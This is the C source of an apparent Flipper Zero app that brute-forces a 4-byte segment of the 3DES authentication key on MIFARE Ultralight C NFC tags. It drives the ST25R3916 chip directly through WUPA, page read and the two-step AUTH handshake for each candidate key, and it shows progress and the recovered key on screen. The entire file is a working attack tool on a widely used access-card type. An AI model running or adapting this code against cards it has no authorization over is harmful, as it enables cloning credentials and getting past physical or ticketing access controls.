#pragma GCC optimize("O3")
#pragma GCC optimize("-funroll-all-loops")

#pragma GCC diagnostic push
// Suppress specific warnings
#pragma GCC diagnostic ignored "-Wdiscarded-qualifiers"

#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_cortex.h>
#include <furi_hal_gpio.h>
#include <furi_hal_spi.h>
#include <notification/notification.h>
#include <notification/notification_messages.h>
#include <gui/gui.h>
#include <input/input.h>
#include <furi_hal_nfc.h>
#include <lib/drivers/st25r3916.h>
#include <lib/nfc/protocols/iso14443_3a/iso14443_3a.h>
#include <lib/nfc/protocols/iso14443_3a/iso14443_3a_listener.h>
#include <nfc/nfc.h>
#include <lib/nfc/protocols/mf_ultralight/mf_ultralight.h>
#include <lib/bit_lib/bit_lib.h>

#define TAG           "ULCBrute"
#define CMD_WUPA      0x52 // 7 bits
/*
#define CMD_ANTICOLL   0x93
#define CMD_ANTICOLL_2 0x95
#define CMD_SELECT     0x93
#define CMD_SELECT_2   0x95
*/
#define CMD_READ_PAGE 0x30

typedef enum {
    AppStateWaiting,
    AppStateBruteforcing,
    AppStateBruteComplete,
    AppStateError,
} AppState;

typedef enum {
    AppModeReady,
    AppModeRunning,
} AppMode;

// Segment of the key to bruteforce
typedef enum {
    AppKeyModeKey1,
    AppKeyModeKey2,
    AppKeyModeKey3,
    AppKeyModeKey4,
} AppKeyMode;

typedef struct {
    AppState state;
    AppMode mode;
    AppKeyMode key_mode;
    const char* error;
    bool field_active;
    ViewPort* view_port;
    Gui* gui;
    FuriMutex* nfc_mutex;
    NotificationApp* notifications;
    FuriMessageQueue* event_queue;
    Nfc* nfc;
    uint32_t current_key_index;
    int time_start;
    FuriThread* bruteforce_thread;
    bool bruteforce_running;
} AppContext;

typedef enum {
    EventTypeTick,
    EventTypeKey,
    EventTypeRx,
} EventType;

typedef struct {
    EventType type;
    InputEvent input;
} AppEvent;

// Forward declarations
static bool send_wupa(const FuriHalSpiBusHandle* handle, uint8_t* rx_buffer, size_t* rx_bits);
static bool send_receive_command_full(
    const FuriHalSpiBusHandle* handle,
    const uint8_t* tx_data,
    size_t tx_bits,
    uint8_t* rx_buffer,
    size_t rx_buffer_size,
    size_t* rx_bits,
    bool send_with_crc);
static bool test_next_key(const FuriHalSpiBusHandle* handle, AppContext* app);

/*
static void log_rx_data(uint8_t* rx_buffer, size_t rx_bits) {
    if(rx_bits > 0) {
        size_t bytes = (rx_bits + 7) / 8;
        char hex_str[128] = {0};
        char* p = hex_str;
        for(size_t i = 0; i < bytes; i++) {
            p += snprintf(p, sizeof(hex_str) - (p - hex_str), "%02X ", rx_buffer[i]);
        }
        FURI_LOG_D(TAG, "RX(%d bits): %s", (int)rx_bits, hex_str);
    }
}
*/

/**
 * Send WUPA using the ST25R3916 built-in command for short frames.
 * This correctly transmits 0x52 (7 bits) and expects a 2-byte response (44 00).
 */
static bool send_wupa(const FuriHalSpiBusHandle* handle, uint8_t* rx_buffer, size_t* rx_bits) {
    // Clear FIFO & interrupts first
    st25r3916_direct_cmd(handle, ST25R3916_CMD_CLEAR_FIFO);
    st25r3916_get_irq(handle);

    // Disable CRC in receive for short frames, and also ensure parity is handled as 7 bits
    st25r3916_set_reg_bits(handle, ST25R3916_REG_AUX, ST25R3916_REG_AUX_no_crc_rx);
    st25r3916_change_reg_bits(
        handle,
        ST25R3916_REG_ISO14443A_NFC,
        (ST25R3916_REG_ISO14443A_NFC_no_tx_par | ST25R3916_REG_ISO14443A_NFC_no_rx_par),
        (ST25R3916_REG_ISO14443A_NFC_no_tx_par_off | ST25R3916_REG_ISO14443A_NFC_no_rx_par_off));

    // Minimal unmask step: Let's just do the direct command
    uint32_t interrupts =
        (ST25R3916_IRQ_MASK_TXE | ST25R3916_IRQ_MASK_RXS | ST25R3916_IRQ_MASK_RXE |
         ST25R3916_IRQ_MASK_PAR | ST25R3916_IRQ_MASK_CRC | ST25R3916_IRQ_MASK_ERR1 |
         ST25R3916_IRQ_MASK_ERR2);
    // Enable them
    st25r3916_mask_irq(handle, ~interrupts);

    // Issue built-in WUPA short frame
    st25r3916_direct_cmd(handle, ST25R3916_CMD_TRANSMIT_WUPA);

    // TODO: Wait for TXE, RXS, RXE or a timeout
    furi_delay_ms(2);

    bool success = st25r3916_read_fifo(handle, rx_buffer, 64, rx_bits);
    //log_rx_data(rx_buffer, *rx_bits);

    // Re-enable normal CRC for subsequent commands, if desired
    st25r3916_clear_reg_bits(handle, ST25R3916_REG_AUX, ST25R3916_REG_AUX_no_crc_rx);
    return success;
}

/**
 * Send command (using full bytes) and read response from FIFO.
 * Typically used for commands that do have parity + CRC in normal ISO14443A (e.g. READ(0x30)).
 */
static bool send_receive_command_full(
    const FuriHalSpiBusHandle* handle,
    const uint8_t* tx_data,
    size_t tx_bits,
    uint8_t* rx_buffer,
    size_t rx_buffer_size,
    size_t* rx_bits,
    bool send_with_crc) {
    // Clear FIFO & interrupts
    st25r3916_direct_cmd(handle, ST25R3916_CMD_CLEAR_FIFO);
    st25r3916_get_irq(handle);

    // Normal parity, normal CRC
    st25r3916_change_reg_bits(
        handle,
        ST25R3916_REG_ISO14443A_NFC,
        (ST25R3916_REG_ISO14443A_NFC_no_tx_par | ST25R3916_REG_ISO14443A_NFC_no_rx_par),
        (ST25R3916_REG_ISO14443A_NFC_no_tx_par_off | ST25R3916_REG_ISO14443A_NFC_no_rx_par_off));
    st25r3916_clear_reg_bits(handle, ST25R3916_REG_AUX, ST25R3916_REG_AUX_no_crc_rx);

    // Write TX data
    st25r3916_write_fifo(handle, tx_data, tx_bits);

    // Choose transmit with or without CRC
    st25r3916_direct_cmd(
        handle,
        send_with_crc ? ST25R3916_CMD_TRANSMIT_WITH_CRC : ST25R3916_CMD_TRANSMIT_WITHOUT_CRC);

    // TODO: Wait for TXE, RXS, RXE or a timeout
    furi_delay_ms(3);

    // Now read FIFO
    bool success = st25r3916_read_fifo(handle, rx_buffer, rx_buffer_size, rx_bits);
    //log_rx_data(rx_buffer, *rx_bits);
    return success;
}

static void des3_init(mbedtls_des3_context* ctx) {
    memset(ctx->private_sk, 0, sizeof(ctx->private_sk));
}

static bool test_next_key(const FuriHalSpiBusHandle* handle, AppContext* app) {
    //FURI_LOG_I(TAG, "Testing key %lu", app->current_key_index);

    uint8_t rx_buffer[32];
    size_t rx_bits = 0;

    // 1) WUPA (7 bits) using built-in short frame
    if(!send_wupa(handle, rx_buffer, &rx_bits)) {
        //FURI_LOG_E(TAG, "WUPA transmit failed");
        return false;
    }

    if(rx_bits != 16 || rx_buffer[0] != 0x44 || rx_buffer[1] != 0x00) {
        //FURI_LOG_E(TAG, "Invalid WUPA response, %d bits", (int)rx_bits);
        return false;
    }

    // Reset rx_buffer and rx_bits
    memset(rx_buffer, 0, sizeof(rx_buffer));
    rx_bits = 0;

    // 2) Read page 0
    {
        uint8_t read_page_cmd[2] = {CMD_READ_PAGE, 0x00};
        if(!send_receive_command_full(
               handle, read_page_cmd, 16, rx_buffer, sizeof(rx_buffer), &rx_bits, true)) {
            //FURI_LOG_E(TAG, "Read page transmit failed");
            return false;
        }
        // Expect 16 bytes + CRC => 18 bytes => 144 bits
        if(rx_bits != (18 * 8)) {
            //FURI_LOG_E(TAG, "Invalid READ_PAGE response, %d bits", (int)rx_bits);
            return false;
        }
    }

    // Reset rx_buffer and rx_bits
    memset(rx_buffer, 0, sizeof(rx_buffer));
    rx_bits = 0;

    // 3) AUTH1 command (0x1A 0x00)
    {
        uint8_t auth1_cmd[2] = {0x1A, 0x00};
        if(!send_receive_command_full(
               handle, auth1_cmd, 16, rx_buffer, sizeof(rx_buffer), &rx_bits, true)) {
            //FURI_LOG_E(TAG, "Failed to send/receive AUTH1 command");
            return false;
        }

        // Expect 10 bytes + 1st byte = 0xAF => 11 bytes => 88 bits
        if(rx_bits != 88 || rx_buffer[0] != 0xAF) {
            //FURI_LOG_E(TAG, "Invalid AUTH1 response, %d bits", (int)rx_bits);
            return false;
        }
    }

    // Extract encrypted RndB from AUTH1 response
    uint8_t enc_rnd_b[8];
    memcpy(enc_rnd_b, rx_buffer + 1, 8);

    // Generate RndA
    uint8_t rnd_a[8];
    furi_hal_random_fill_buf(rnd_a, 8);

    // Decrypt RndB using current key
    uint8_t iv[8] = {0};
    uint8_t rnd_b[8];
    uint8_t key[16] = {0};

    // Convert current key index into 4 bytes with LSB=0
    uint32_t idx = app->current_key_index;
    uint8_t b0 = (idx & 0x7F) << 1;
    uint8_t b1 = ((idx >> 7) & 0x7F) << 1;
    uint8_t b2 = ((idx >> 14) & 0x7F) << 1;
    uint8_t b3 = ((idx >> 21) & 0x7F) << 1;

    uint8_t offset = 4 * (app->key_mode);
    key[offset] = b3;
    key[offset + 1] = b2;
    key[offset + 2] = b1;
    key[offset + 3] = b0;

    // Initialize DES3 context
    mbedtls_des3_context ctx;
    des3_init(&ctx);

    mf_ultralight_3des_decrypt(&ctx, key, iv, enc_rnd_b, 8, rnd_b);

    // Shift RndB left by 8 bits
    mf_ultralight_3des_shift_data(rnd_b);

    // Concatenate RndA || RndB'
    uint8_t auth2_data[16];
    memcpy(auth2_data, rnd_a, 8);
    memcpy(auth2_data + 8, rnd_b, 8);

    // Encrypt auth2 data
    uint8_t auth2_cmd[17] = {0xAF};
    mf_ultralight_3des_encrypt(&ctx, key, enc_rnd_b, auth2_data, 16, auth2_cmd + 1);

    // Send AUTH2 command
    if(!send_receive_command_full(
           handle, auth2_cmd, 136, rx_buffer, sizeof(rx_buffer), &rx_bits, true)) {
        //FURI_LOG_E(TAG, "Failed to send/receive AUTH2 command");
        return false;
    }

    // Check if authentication succeeded
    // This is 88 bits but the RX buffer is sometimes still being filled when we read it, so we choose a number over 4 bits
    if(rx_bits > 16 && rx_buffer[0] == 0x00) {
        /*
        // Decrypt response and verify RndA
        uint8_t dec_rnd_a[8];
        mf_ultralight_3des_decrypt(&ctx, key, rnd_b, rx_buffer + 1, 8, dec_rnd_a);
        mf_ultralight_3des_shift_data(rnd_a);
        if(memcmp(rnd_a, dec_rnd_a, 8) == 0) {
            uint32_t found_key = (uint32_t)b3 << 24 | (uint32_t)b2 << 16 | (uint32_t)b1 << 8 | b0;
            FURI_LOG_I(TAG, "Key found: %08lX", found_key);
            app->state = AppStateBruteComplete;
            return true;
        }
        */
        uint32_t found_key = (uint32_t)b3 << 24 | (uint32_t)b2 << 16 | (uint32_t)b1 << 8 | b0;
        FURI_LOG_I(TAG, "Key found: %08lX", found_key);
        app->state = AppStateBruteComplete;
        return true;
    }

    if(app->current_key_index < (1 << 28)) {
        app->current_key_index++;
    } else {
        app->state = AppStateBruteComplete;
    }
    return false;
}

static void setup_nfc_field(const FuriHalSpiBusHandle* handle) {
    FURI_LOG_I(TAG, "setup_nfc_field");
    st25r3916_direct_cmd(handle, ST25R3916_CMD_SET_DEFAULT);
    furi_delay_ms(1);
    st25r3916_direct_cmd(handle, ST25R3916_CMD_CLEAR_FIFO);
    st25r3916_write_reg(handle, ST25R3916_REG_MODE, ST25R3916_REG_MODE_om_iso14443a);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_BIT_RATE,
        ST25R3916_REG_BIT_RATE_rxrate_106 | ST25R3916_REG_BIT_RATE_txrate_106);
    st25r3916_write_reg(handle, ST25R3916_REG_RX_CONF1, ST25R3916_REG_RX_CONF1_z600k);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_RX_CONF2,
        ST25R3916_REG_RX_CONF2_sqm_dyn | ST25R3916_REG_RX_CONF2_agc_en |
            ST25R3916_REG_RX_CONF2_agc_m);
    st25r3916_write_reg(handle, ST25R3916_REG_RX_CONF3, 0x00);
    st25r3916_write_reg(handle, ST25R3916_REG_RX_CONF4, 0x00);
    st25r3916_write_reg(handle, ST25R3916_REG_ISO14443A_NFC, 0x00);
    st25r3916_write_reg(handle, ST25R3916_REG_EMD_SUP_CONF, 0x00);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_CORR_CONF1,
        ST25R3916_REG_CORR_CONF1_corr_s7 | ST25R3916_REG_CORR_CONF1_corr_s6 |
            ST25R3916_REG_CORR_CONF1_corr_s5 | ST25R3916_REG_CORR_CONF1_corr_s4);
    st25r3916_write_reg(handle, ST25R3916_REG_CORR_CONF2, 0x00);
    st25r3916_write_reg(handle, ST25R3916_REG_MASK_RX_TIMER, 0x00);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_TIMER_EMV_CONTROL,
        ST25R3916_REG_TIMER_EMV_CONTROL_nrt_emv_off |
            ST25R3916_REG_TIMER_EMV_CONTROL_nrt_step_64fc);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_FIELD_THRESHOLD_ACTV,
        ST25R3916_REG_FIELD_THRESHOLD_ACTV_trg_105mV |
            ST25R3916_REG_FIELD_THRESHOLD_ACTV_rfe_105mV);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_FIELD_THRESHOLD_DEACTV,
        ST25R3916_REG_FIELD_THRESHOLD_DEACTV_trg_75mV |
            ST25R3916_REG_FIELD_THRESHOLD_DEACTV_rfe_75mV);
    st25r3916_write_reg(handle, ST25R3916_REG_ANT_TUNE_A, 0x82);
    st25r3916_write_reg(handle, ST25R3916_REG_ANT_TUNE_B, 0x82);
    st25r3916_get_irq(handle);
    st25r3916_direct_cmd(handle, ST25R3916_CMD_UNMASK_RECEIVE_DATA);
    furi_delay_ms(1);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_OP_CONTROL,
        ST25R3916_REG_OP_CONTROL_tx_en | ST25R3916_REG_OP_CONTROL_rx_en |
            ST25R3916_REG_OP_CONTROL_en);
    furi_delay_ms(10);
    FURI_LOG_I(TAG, "RF field enabled");
}

static void disable_nfc_field(const FuriHalSpiBusHandle* handle) {
    FURI_LOG_I(TAG, "Disabling NFC field");
    st25r3916_write_reg(handle, ST25R3916_REG_OP_CONTROL, 0x00);
    st25r3916_direct_cmd(handle, ST25R3916_CMD_SET_DEFAULT);
    st25r3916_direct_cmd(handle, ST25R3916_CMD_CLEAR_FIFO);
    st25r3916_get_irq(handle);
    furi_delay_ms(1);
    FURI_LOG_I(TAG, "NFC field disabled");
}

static void render_callback(Canvas* canvas, void* ctx) {
    AppContext* app = ctx;
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);

    const char* mode_str = (app->mode == AppModeReady) ? "ULC Brute" : "ULC Brute: Running";
    canvas_draw_str(canvas, 2, 12, mode_str);

    canvas_set_font(canvas, FontSecondary);
    switch(app->state) {
    case AppStateWaiting:
        canvas_draw_str(canvas, 2, 24, "Press OK to begin bruteforce");
        char key_mode_str[32];
        snprintf(key_mode_str, sizeof(key_mode_str), "Key segment (DOWN): %d", app->key_mode + 1);
        canvas_draw_str(canvas, 2, 60, key_mode_str);
        break;
    case AppStateBruteforcing:
        canvas_draw_str(canvas, 2, 24, "Bruteforcing...");
        char key_str[32];
        double key_index = app->current_key_index / (double)(1 << 28);
        snprintf(key_str, sizeof(key_str), "Progress: %.4f%%", key_index * 100);
        canvas_draw_str(canvas, 2, 36, key_str);
        char benchmark_str[32];
        int time_elapsed = furi_hal_rtc_get_timestamp() - app->time_start;
        if(time_elapsed > 0) {
            double keys_per_sec = app->current_key_index / (double)time_elapsed;
            snprintf(benchmark_str, sizeof(benchmark_str), "Speed: %.1f keys/sec", keys_per_sec);
        } else {
            snprintf(benchmark_str, sizeof(benchmark_str), "Speed: -- keys/sec");
        }
        canvas_draw_str(canvas, 2, 48, benchmark_str);
        char total_keys_str[32];
        snprintf(
            total_keys_str, sizeof(total_keys_str), "Keys tested: %lu", app->current_key_index);
        canvas_draw_str(canvas, 2, 60, total_keys_str);
        break;
    case AppStateBruteComplete:
        canvas_draw_str(canvas, 2, 24, "Bruteforce complete! Key:");
        uint8_t key[16] = {0};

        // Convert current key index into 4 bytes with LSB=0
        uint32_t idx = app->current_key_index;
        uint8_t b0 = (idx & 0x7F) << 1;
        uint8_t b1 = ((idx >> 7) & 0x7F) << 1;
        uint8_t b2 = ((idx >> 14) & 0x7F) << 1;
        uint8_t b3 = ((idx >> 21) & 0x7F) << 1;

        uint8_t offset = 4 * (app->key_mode);
        key[offset] = b3;
        key[offset + 1] = b2;
        key[offset + 2] = b1;
        key[offset + 3] = b0;

        char result_str[32];
        char result_str_2[32];
        snprintf(
            result_str,
            sizeof(result_str),
            "%02X%02X%02X%02X %02X%02X%02X%02X",
            key[0],
            key[1],
            key[2],
            key[3],
            key[4],
            key[5],
            key[6],
            key[7]);
        snprintf(
            result_str_2,
            sizeof(result_str_2),
            "%02X%02X%02X%02X %02X%02X%02X%02X",
            key[8],
            key[9],
            key[10],
            key[11],
            key[12],
            key[13],
            key[14],
            key[15]);
        canvas_draw_str(canvas, 2, 36, result_str);
        canvas_draw_str(canvas, 2, 48, result_str_2);
        break;
    case AppStateError:
        canvas_draw_str(canvas, 2, 24, "Error!");
        if(app->error) canvas_draw_str(canvas, 2, 36, app->error);
        break;
    }
}

static void input_callback(InputEvent* input_event, void* ctx) {
    furi_assert(ctx);
    AppContext* app = ctx;
    AppEvent event = {.type = EventTypeKey, .input = *input_event};
    furi_message_queue_put(app->event_queue, &event, FuriWaitForever);
}

static int32_t bruteforce_worker(void* context) {
    AppContext* app = context;
    app->bruteforce_running = true;
    app->state = AppStateBruteforcing;
    app->time_start = furi_hal_rtc_get_timestamp();

    furi_hal_spi_acquire(&furi_hal_spi_bus_handle_nfc);
    setup_nfc_field(&furi_hal_spi_bus_handle_nfc);
    app->field_active = true;

    while(app->bruteforce_running && app->state == AppStateBruteforcing) {
        if(test_next_key(&furi_hal_spi_bus_handle_nfc, app)) {
            app->mode = AppModeReady;
            app->state = AppStateBruteComplete;
            break;
        }
    }

    if(app->field_active) {
        disable_nfc_field(&furi_hal_spi_bus_handle_nfc);
        furi_hal_spi_release(&furi_hal_spi_bus_handle_nfc);
        app->field_active = false;
    }

    app->bruteforce_running = false;
    return 0;
}

int32_t ulc_brute_app(void* p) {
    UNUSED(p);

    // Allocate app context
    AppContext* app = malloc(sizeof(AppContext));
    memset(app, 0, sizeof(AppContext));
    app->time_start = furi_hal_rtc_get_timestamp();
    app->state = AppStateWaiting;
    app->event_queue = furi_message_queue_alloc(8, sizeof(AppEvent));
    app->nfc_mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    app->notifications = furi_record_open(RECORD_NOTIFICATION);
    app->current_key_index = 0;

    // GUI
    app->gui = furi_record_open(RECORD_GUI);
    app->view_port = view_port_alloc();
    view_port_draw_callback_set(app->view_port, render_callback, app);
    view_port_input_callback_set(app->view_port, input_callback, app);
    gui_add_view_port(app->gui, app->view_port, GuiLayerFullscreen);

    // Create bruteforce thread
    app->bruteforce_thread = furi_thread_alloc();
    furi_thread_set_name(app->bruteforce_thread, "ULCBruteWorker");
    furi_thread_set_stack_size(app->bruteforce_thread, 2048);
    furi_thread_set_context(app->bruteforce_thread, app);
    furi_thread_set_callback(app->bruteforce_thread, bruteforce_worker);

    bool running = true;
    AppEvent event;

    while(running) {
        FuriStatus status = furi_message_queue_get(app->event_queue, &event, 100);

        if(status == FuriStatusOk) {
            if(event.type == EventTypeKey && event.input.type == InputTypeShort) {
                // If user hasn't begun bruteforce yet
                if(!app->bruteforce_running) {
                    if(event.input.key == InputKeyUp) {
                        if(app->key_mode > AppKeyModeKey1) {
                            app->key_mode--;
                        }
                    } else if(event.input.key == InputKeyDown) {
                        if(app->key_mode < AppKeyModeKey4) {
                            app->key_mode++;
                        }
                    } else if(event.input.key == InputKeyOk) {
                        app->mode = AppModeRunning;
                        notification_message(app->notifications, &sequence_blink_start_cyan);
                        furi_thread_start(app->bruteforce_thread);
                    }
                }

                // Handle BACK => exit
                if(event.input.key == InputKeyBack) {
                    if(app->bruteforce_running) {
                        app->bruteforce_running = false;
                        furi_thread_join(app->bruteforce_thread);
                    }
                    notification_message(app->notifications, &sequence_blink_stop);
                    running = false;
                    break;
                }
            }
        }

        view_port_update(app->view_port);
    }

    // Cleanup
    furi_thread_free(app->bruteforce_thread);
    view_port_enabled_set(app->view_port, false);
    gui_remove_view_port(app->gui, app->view_port);
    view_port_free(app->view_port);
    furi_record_close(RECORD_GUI);
    furi_message_queue_free(app->event_queue);
    furi_record_close(RECORD_NOTIFICATION);
    furi_mutex_free(app->nfc_mutex);
    free(app);

    return 0;
}

#pragma GCC diagnostic pop
